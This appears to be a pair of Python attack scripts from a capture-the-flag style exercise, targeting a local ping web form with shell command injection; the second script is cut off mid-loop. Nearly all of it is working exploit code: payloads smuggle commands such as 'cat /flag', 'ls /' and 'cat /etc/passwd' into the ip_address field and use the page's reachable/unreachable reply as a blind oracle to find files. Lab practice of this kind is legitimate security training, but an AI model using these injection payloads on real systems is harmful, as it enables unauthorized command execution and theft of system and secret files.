import requests
import re

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

# Headers for the request
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

def send_ping(payload):
    """Send ping request with payload and return response"""
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def check_response(response_text):
    """Check if response indicates success or failure"""
    if "reachable" in response_text.lower():
        return "REACHABLE"
    elif "unreachable" in response_text.lower():
        return "UNREACHABLE"
    else:
        return "UNKNOWN"

print("=" * 70)
print("BLIND FILE ENUMERATION - Ping Tool Command Injection")
print("=" * 70)

# Test 1: Known working pattern as baseline
print("\n[TEST 1] Baseline - Valid IP with pipe")
baseline_payload = "127.0.0.1 | echo test"
resp = send_ping(baseline_payload)
print(f"Payload: {baseline_payload}")
print(f"Response: {check_response(resp)}")
print(f"Raw: {resp[:200]}")

# Test 2: Test file existence patterns one by one
print("\n[TEST 2] File existence check patterns")
flag_paths = [
    "/flag", "/flag.txt", "/FLAG", "/FLAG.txt",
    "/root/flag", "/root/flag.txt",
    "/home/flag", "/home/flag.txt",
    "/tmp/flag", "/tmp/flag.txt",
    "/var/flag", "/var/flag.txt",
    "/app/flag", "/app/flag.txt",
    "/challenge/flag", "/ctf/flag",
    "/app/static/flag.txt"
]

patterns = [
    # Pattern: description -> payload template
    ("AND cat", "127.0.0.1 && cat {}"),
    ("AND ls", "127.0.0.1 && ls {}"),
    ("AND test -f", "127.0.0.1 && test -f {}"),
    ("OR cat", "127.0.0.1 || cat {}"),
    ("Semicolon cat", "127.0.0.1; cat {}"),
    ("PIPE cat", "127.0.0.1 | cat {}"),
    ("PIPE test -f", "127.0.0.1 | test -f {}"),
]

results = []

for pattern_name, template in patterns:
    print(f"\n--- Testing pattern: {pattern_name} ---")
    for path in flag_paths:
        payload = template.format(path)
        resp = send_ping(payload)
        status = check_response(resp)
        
        # Store result
        results.append({
            "pattern": pattern_name,
            "path": path,
            "payload": payload,
            "status": status
        })
        
        # Print if reachable (potential hit)
        if status == "REACHABLE":
            print(f"  [HIT] {path} -> {status}")
            print(f"        Payload: {payload}")
        else:
            print(f"  [miss] {path} -> {status}")

# Test 3: List directory contents
print("\n[TEST 3] Directory listing attempts")
dir_commands = [
    ("ls root", "127.0.0.1 | ls /"),
    ("ls app", "127.0.0.1 | ls /app/"),
    ("ls current", "127.0.0.1 | ls ."),
    ("pwd", "127.0.0.1 | pwd"),
]

for desc, cmd in dir_commands:
    resp = send_ping(cmd)
    status = check_response(resp)
    print(f"  {desc}: {status} | Payload: {cmd}")

# Summary
print("\n" + "=" * 70)
print("SUMMARY OF REACHABLE RESULTS")
print("=" * 70)

reachable_results = [r for r in results if r["status"] == "REACHABLE"]
if reachable_results:
    print(f"\nFound {len(reachable_results)} reachable results:")
    for r in reachable_results:
        print(f"  - {r['path']} via {r['pattern']}")
        print(f"    Payload: {r['payload']}")
else:
    print("\nNo files produced 'REACHABLE' response with tested patterns.")
    print("\nAll results were UNREACHABLE:")
    for r in results[:10]:  # Show first 10
        print(f"  - {r['path']} via {r['pattern']}: {r['status']}")

import requests
import re

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def get_result_type(text):
    """Extract reachable/unreachable status"""
    if "reachable" in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    return "UNKNOWN"

print("COMPARATIVE ANALYSIS - Find differential pattern")
print("=" * 60)

# Test control cases
print("\n[Control Tests]")

test_cases = [
    ("Valid IP only", "127.0.0.1"),
    ("Invalid IP", "999.999.999.999"),
    ("Invalid IP pipe echo", "999.999.999.999 | echo test"),
    ("Valid IP pipe echo", "127.0.0.1 | echo test"),
    ("Valid IP && true", "127.0.0.1 && true"),
    ("Valid IP && false", "127.0.0.1 && false"),
    ("Valid IP ; true", "127.0.0.1 ; true"),
    ("Valid IP ; false", "127.0.0.1 ; false"),
    ("False only", "false"),
    ("True only", "true"),
    ("Nonexistent cmd", "127.0.0.1 && /nonexistent/cmd"),
    ("Cat nonexistent file", "127.0.0.1 && cat /nonexistent_file_12345"),
    ("Cat /etc/hostname", "127.0.0.1 && cat /etc/hostname"),
]

results = {}
for desc, payload in test_cases:
    resp = send_ping(payload)
    result = get_result_type(resp)
    results[desc] = {"payload": payload, "result": result}
    status_marker = "[!]" if result == "REACHABLE" else "[ ]"
    print(f"{status_marker} {desc:25} -> {result:12} | {payload}")

print("\n" + "=" * 60)
print("Now testing file existence with && cat /file")
print("Testing KNOWN existing vs KNOWN non-existing files")
print("=" * 60)

# Test known existent vs non-existent files
file_tests = [
    ("/etc/hostname (exists)", "127.0.0.1 && cat /etc/hostname"),
    ("/etc/passwd (exists)", "127.0.0.1 && cat /etc/passwd"),
    ("/nonexistent_xyz (not exists)", "127.0.0.1 && cat /nonexistent_xyz_12345"),
    ("/flag (target)", "127.0.0.1 && cat /flag"),
    ("/flag.txt (target)", "127.0.0.1 && cat /flag.txt"),
]

print("\n[File Existence Tests with && cat]")
for desc, payload in file_tests:
    resp = send_ping(payload)
    result = get_result_type(resp)
    status_marker = "[!]" if result == "REACHABLE" else "[ ]"
    print(f"{status_marker} {desc:30} -> {result:12}")

print("\n[File Existence Tests with ; cat]")
for desc, payload in file_tests:
    payload_alt = payload.replace("&&", ";")
    resp = send_ping(payload_alt)
    result = get_result_type(resp)
    status_marker = "[!]" if result == "REACHABLE" else "[ ]"
    print(f"{status_marker} {desc:30} -> {result:12} | {payload_alt}")

print("\n[File Existence Tests with | cat]")
for desc, payload in file_tests:
